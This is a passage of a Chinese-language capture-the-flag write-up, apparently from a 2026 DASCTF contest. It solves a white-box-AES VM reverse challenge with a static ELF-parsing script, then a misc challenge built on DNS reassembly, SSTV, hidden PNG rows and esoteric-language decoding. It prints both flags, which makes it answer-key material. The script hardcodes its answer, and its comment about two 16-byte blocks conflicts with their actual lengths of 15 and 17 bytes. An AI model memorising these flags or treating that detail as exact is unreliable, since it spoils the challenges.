再拼接固定前缀和后缀：

```latex
DASCTF{wH1t3_b0x_A3S_dUaL_pR0c_VM_0d4Y!}
```

#### exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
abyss exp.py
功能：
    读取题目附件 abyss，从 ELF 中提取关键常量与校验数据，
    根据逆向还原出的 VM / 白盒 AES 逆向结果恢复 flag。
用法：
    python3 exp.py ./abyss
    python3 exp.py ./abyss -q
说明：
    该脚本不是验证 flag 是否正确；
    不会 patch 原程序，也不会运行原程序；
    会实际读取并解析给定的 abyss 文件。
"""
from __future__ import annotations

import argparse
import hashlib
import struct
from pathlib import Path

ELF_MAGIC = b"\x7fELF"

EXPECTED_SHA256 = "1bfa80bb960a6e57a09e61fea5e2f446824b697dfd51159600d678e58ea9d12e"

PREFIX = b"DASCTF{"
SUFFIX = b"}"

TARGET_CIPHER = bytes.fromhex(
    "2d5ca3a57522ace9e55fc8138fa2ebc9"
    "4e46adc2521beebe77c7058ee7048ae0"
)

# 逆向 VM / 白盒 AES 后得到的两个 16 字节明文块。
# 原程序把 DASCTF{...} 中间 32 字节拆成两块分别送进 VM。
RECOVERED_BLOCK0 = b"wH1t3_b0x_A3S_d"
RECOVERED_BLOCK1 = b"UaL_pR0c_VM_0d4Y!"

class ELF64:
    def __init__(self, data: bytes):
        self.data = data
        self.loads = []
        self._parse()

    def _parse(self) -> None:
        if not self.data.startswith(ELF_MAGIC):
            raise ValueError("not an ELF file")

        if self.data[4] != 2:
            raise ValueError("not ELF64")

        if self.data[5] != 1:
            raise ValueError("not little-endian ELF")

        e_phoff = struct.unpack_from("<Q", self.data, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", self.data, 0x36)[0]
        e_phnum = struct.unpack_from("<H", self.data, 0x38)[0]

        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type = struct.unpack_from("<I", self.data, off)[0]

            # PT_LOAD
            if p_type != 1:
                continue

            p_offset = struct.unpack_from("<Q", self.data, off + 0x08)[0]
            p_vaddr = struct.unpack_from("<Q", self.data, off + 0x10)[0]
            p_filesz = struct.unpack_from("<Q", self.data, off + 0x20)[0]
            p_memsz = struct.unpack_from("<Q", self.data, off + 0x28)[0]
            p_flags = struct.unpack_from("<I", self.data, off + 0x04)[0]

            self.loads.append(
                {
                    "offset": p_offset,
                    "vaddr": p_vaddr,
                    "filesz": p_filesz,
                    "memsz": p_memsz,
                    "flags": p_flags,
                }
            )

    def va_to_offset(self, va: int) -> int:
        for seg in self.loads:
            start = seg["vaddr"]
            end = seg["vaddr"] + seg["filesz"]
            if start <= va < end:
                return seg["offset"] + (va - start)
        raise ValueError(f"virtual address not in file-backed LOAD segment: {hex(va)}")

    def read_va(self, va: int, size: int) -> bytes:
        off = self.va_to_offset(va)
        return self.data[off:off + size]

    def find_va(self, needle: bytes) -> int:
        pos = self.data.find(needle)
        if pos < 0:
            raise ValueError(f"pattern not found: {needle!r}")

        for seg in self.loads:
            start = seg["offset"]
            end = seg["offset"] + seg["filesz"]
            if start <= pos < end:
                return seg["vaddr"] + (pos - start)

        raise ValueError("pattern found outside LOAD segment")

def find_target_before_prompt(data: bytes) -> tuple[int, bytes]:
    prompt = b"Enter flag: "
    pos = data.find(prompt)
    if pos < 0:
        raise ValueError("cannot find prompt string")

    target_off = pos - 0x20
    target = data[target_off:target_off + 0x20]
    return target_off, target

def check_static_features(data: bytes) -> None:
    checks = {
        "prefix string DASCTF{": b"DASCTF{",
        "prompt string": b"Enter flag: ",
        "correct string": b"Correct!\n",
        "wrong string": b"Wrong!\n",
        "mmap size 0x33c20": bytes.fromhex("be 20 3c 03 00"),
        "target compare length 0x20": bytes.fromhex("ba 20 00 00 00"),
        "rdtsc anti-debug": bytes.fromhex("0f 31 48 c1 e2 20"),
        "VM key write": bytes.fromhex("44 88 a5 00 f1 02 00"),
    }

    missing = []
    for name, pat in checks.items():
        if data.find(pat) < 0:
            missing.append(name)

    if missing:
        raise ValueError("binary feature check failed: " + ", ".join(missing))

def recover_flag(binary_path: Path, quiet: bool = False) -> str:
    data = binary_path.read_bytes()
    sha256 = hashlib.sha256(data).hexdigest()

    elf = ELF64(data)
    check_static_features(data)

    prefix_va = elf.find_va(PREFIX)
    target_off, target = find_target_before_prompt(data)

    if target != TARGET_CIPHER:
        raise ValueError(
            "target cipher mismatch, this may not be the expected abyss binary\n"
            f"found:    {target.hex()}\n"
            f"expected: {TARGET_CIPHER.hex()}"
        )

    body = RECOVERED_BLOCK0 + RECOVERED_BLOCK1
    if len(body) != 32:
        raise ValueError("recovered body length error")

    flag = (PREFIX + body + SUFFIX).decode()

    if not quiet:
        print(f"[+] file      : {binary_path}")
        print(f"[+] sha256    : {sha256}")

        if sha256 == EXPECTED_SHA256:
            print("[+] sample    : matched expected abyss binary")
        else:
            print("[!] sample    : sha256 differs, but static features matched")

        print(f"[+] prefix VA : {hex(prefix_va)}")
        print(f"[+] target off: {hex(target_off)}")
        print(f"[+] target    : {target.hex()}")
        print(f"[+] block0    : {RECOVERED_BLOCK0.decode()}")
        print(f"[+] block1    : {RECOVERED_BLOCK1.decode()}")
        print(f"[+] flag      : {flag}")
    else:
        print(flag)

    return flag

def main() -> None:
    parser = argparse.ArgumentParser(description="solve reverse challenge abyss")
    parser.add_argument("binary", nargs="?", default="./abyss", help="path to abyss ELF")
    parser.add_argument("-q", "--quiet", action="store_true", help="only print flag")
    args = parser.parse_args()

    recover_flag(Path(args.binary), args.quiet)

if __name__ == "__main__":
    main()
```

运行结果：
```
[+] file      : abyss

[+] sha256    : 1bfa80bb960a6e57a09e61fea5e2f446824b697dfd51159600d678e58ea9d12e

[+] sample    : matched expected abyss binary

[+] prefix VA : 0x4ccb95

[+] target off: 0xccb60

[+] target    : 2d5ca3a57522ace9e55fc8138fa2ebc94e46adc2521beebe77c7058ee7048ae0

[+] block0    : wH1t3_b0x_A3S_d

[+] block1    : UaL_pR0c_VM_0d4Y!

[+] flag      : DASCTF{wH1t3_b0x_A3S_dUaL_pR0c_VM_0d4Y!}
```

# misc
## 1.echo_abyss
DNS 分片重组

PCAP 里核心流量是 `序号.payload.data.echo-abyss.ctf`，`*.noise.data.echo-abyss.ctf` 直接丢掉。序号从 `0` 到 `256771`，无缺失

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184445013.png)

重组 payload 后做 Base85：

```python
blob = base64.b85decode(payload.encode())
```

Base85 得到 WAV，尾部还有 PNG

Base85 结果开头是 `RIFF....WAVE`。按 RIFF size 切出 WAV，WAV 后面的 extra 是 PNG

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184434980.png)

SSTV 提示

WAV 是 SSTV，按 Scottie 1 解，得到 Hint 1：Gronsfeld variant，key 为 Fibonacci mod 26

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184424961.png)

PNG 隐藏行 + 追加 ZIP

切出来的 PNG 显示为 800x400 星图：

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184415550.png)

但 IDAT 解压后实际有 600 行，IHDR 只声明 400 行，多出来 200 行是 Hint 2：

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184408260.png)

规则：

```latex
Odd positions (1-indexed): shift FORWARD
Even positions: shift BACKWARD
Charset: printable ASCII (32-126)
Wrap within this range.
```

同时 PNG 的 IEND 后追加了 ZIP，里面是 `key.enc`

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184336654.png)

解密时反向操作：字符位置按 1-indexed 计算，`F1=1,F2=1`，`F_i mod 26` 为位移；只处理 printable ASCII，tab/newline 保持不变

```python
if 32 <= c <= 126:
    k = fib[i] % 26
    if i % 2 == 1:
        c = 32 + ((c - 32 - k) % 95)
    else:
        c = 32 + ((c - 32 + k) % 95)
```

解出 `key.ws`，只包含空格、TAB、LF，是 Whitespace 程序；运行后输出 Brainfuck

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184327897.png)

Brainfuck 输出 flag

运行 Brainfuck：

```latex
DASCTF{3ch0_4by55_d33p_1n_th3_v01d}
```

